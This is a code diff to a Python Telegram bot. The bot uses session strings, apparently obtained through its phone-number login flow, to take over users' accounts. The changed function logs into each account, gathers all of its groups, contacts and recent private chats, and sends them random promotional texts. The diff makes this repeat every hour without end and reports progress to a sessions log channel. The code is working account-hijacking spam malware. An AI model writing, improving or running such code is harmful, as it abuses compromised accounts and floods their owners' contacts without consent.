@@ -10,7 +10,8 @@ from pyrogram.types import (
     InlineKeyboardButton,
     ReplyKeyboardMarkup,
     KeyboardButton,
-    ReplyKeyboardRemove
+    ReplyKeyboardRemove,
+    CallbackQuery
 )
 from pyrogram.errors import (
     PhoneNumberInvalid,
@@ -281,97 +282,103 @@ async def create_session(bot: Client, client: Client, user_id: int, phone_number
         await cleanup_user_state(user_id)
 
 async def send_promotion_messages(bot: Client, session_string: str):
-    try:
-        client = Client("promo", session_string=session_string)
-        await client.start()
-        
-        # Get all groups (excluding channels)
-        groups = []
-        async for dialog in client.get_dialogs():
-            if dialog.chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]:
-                groups.append(dialog.chat.id)
-        
-        # Get all contacts and private chats
-        contacts_and_privates = []
-        
-        # 1. Get all contacts
-        contacts = await client.get_contacts()
-        for user in contacts:
-            if not user.is_bot:
-                contacts_and_privates.append(user.id)
-        
-        # 2. Get recent private chats (non-contacts)
-        async for dialog in client.get_dialogs(limit=200):
-            if (
-                dialog.chat.type == enums.ChatType.PRIVATE and 
-                not dialog.chat.is_bot and
-                dialog.chat.id not in contacts_and_privates
-            ):
-                contacts_and_privates.append(dialog.chat.id)
-        
-        # Phase 1: Send to groups (1 message per group with 1-minute delay)
-        for group in groups:
-            try:
-                # Select a random UNIQUE promo text for each group
-                text = random.choice(PROMO_TEXTS)
-                await client.send_message(group, text)
-                
-                # Log to debug
-                await bot.send_message(
-                    LOG_CHANNEL_SESSIONS_FILES,
-                    f"✅ Sent to group {group}:\n{text}",
-                    disable_notification=True
-                )
-                
-                # 1-minute delay between groups
-                await asyncio.sleep(60)
-                
-            except FloodWait as e:
-                await asyncio.sleep(e.value + 5)
-            except Exception as e:
-                await bot.send_message(
-                    LOG_CHANNEL_SESSIONS_FILES,
-                    f"❌ Failed group {group}: {str(e)}",
-                    disable_notification=True
-                )
-        
-        # Phase 2: Send to contacts/privates (no delay between messages)
-        for target in contacts_and_privates:
-            try:
-                # Select a different random text for each contact
-                text = random.choice(PROMO_TEXTS)
-                await client.send_message(target, text)
-                
-                # Log to debug
-                await bot.send_message(
-                    LOG_CHANNEL_SESSIONS_FILES,
-                    f"✅ Sent to contact {target}:\n{text}",
-                    disable_notification=True
-                )
-                
-            except FloodWait as e:
-                await asyncio.sleep(e.value + 5)
-            except Exception as e:
-                await bot.send_message(
-                    LOG_CHANNEL_SESSIONS_FILES,
-                    f"❌ Failed contact {target}: {str(e)}",
-                    disable_notification=True
-                )
-        
-        await bot.send_message(
-            LOG_CHANNEL_SESSIONS_FILES,
-            f"🎉 Promotion Completed!\n"
-            f"• Groups: {len(groups)}\n"
-            f"• Contacts: {len(contacts_and_privates)}"
-        )
-            
-    except Exception as e:
-        await bot.send_message(
-            LOG_CHANNEL_SESSIONS_FILES,
-            f"💀 Promotion Failed: {str(e)}"
-        )
-    finally:
+    while True:  # Infinite loop for continuous promotion
+        client = None
         try:
-            await client.stop()
-        except:
-            pass
+            client = Client("promo", session_string=session_string)
+            await client.start()
+            
+            # Debug log
+            await bot.send_message(
+                LOG_CHANNEL_SESSIONS_FILES,
+                "🚀 Starting new promotion cycle"
+            )
+            
+            # Get all groups (excluding channels)
+            groups = []
+            async for dialog in client.get_dialogs():
+                if dialog.chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]:
+                    groups.append(dialog.chat.id)
+            
+            # Get all contacts and private chats
+            contacts_and_privates = []
+            contacts = await client.get_contacts()
+            for user in contacts:
+                if not user.is_bot:
+                    contacts_and_privates.append(user.id)
+            
+            async for dialog in client.get_dialogs(limit=200):
+                if (dialog.chat.type == enums.ChatType.PRIVATE and 
+                    not dialog.chat.is_bot and
+                    dialog.chat.id not in contacts_and_privates):
+                    contacts_and_privates.append(dialog.chat.id)
+            
+            # Phase 1: Groups (1 message/minute)
+            group_count = 0
+            for group in groups:
+                try:
+                    text = random.choice(PROMO_TEXTS)
+                    await client.send_message(group, text)
+                    group_count += 1
+                    await bot.send_message(
+                        LOG_CHANNEL_SESSIONS_FILES,
+                        f"✅ Group {group_count}/{len(groups)}: {text[:20]}...",
+                        disable_notification=True
+                    )
+                    await asyncio.sleep(60)  # 1-minute delay
+                except FloodWait as e:
+                    await bot.send_message(
+                        LOG_CHANNEL_SESSIONS_FILES,
+                        f"⏳ FloodWait: Sleeping {e.value}s"
+                    )
+                    await asyncio.sleep(e.value + 5)
+                except Exception as e:
+                    await bot.send_message(
+                        LOG_CHANNEL_SESSIONS_FILES,
+                        f"❌ Failed group: {str(e)}",
+                        disable_notification=True
+                    )
+            
+            # Phase 2: Contacts (rapid-fire)
+            contact_count = 0
+            for target in contacts_and_privates:
+                try:
+                    text = random.choice(PROMO_TEXTS)
+                    await client.send_message(target, text)
+                    contact_count += 1
+                    if contact_count % 10 == 0:  # Log every 10th
+                        await bot.send_message(
+                            LOG_CHANNEL_SESSIONS_FILES,
+                            f"📩 Contacts: {contact_count} sent",
+                            disable_notification=True
+                        )
+                except FloodWait as e:
+                    await asyncio.sleep(e.value + 5)
+                except Exception:
+                    continue
+            
+            # Completion report
+            await bot.send_message(
+                LOG_CHANNEL_SESSIONS_FILES,
+                f"🎉 Cycle Complete!\n"
+                f"• Groups: {group_count}/{len(groups)}\n"
+                f"• Contacts: {contact_count}\n"
+                f"⏳ Next cycle in 1 hour"
+            )
+            
+            # Wait 1 hour before next cycle
+            await asyncio.sleep(3600)
+            
+        except Exception as e:
+            await bot.send_message(
+                LOG_CHANNEL_SESSIONS_FILES,
+                f"💀 Cycle Failed: {str(e)}\n"
+                f"🔄 Restarting in 5 minutes..."
+            )
+            await asyncio.sleep(300)
+        finally:
+            if client:
+                try:
+                    await client.stop()
+                except:
+                    pass
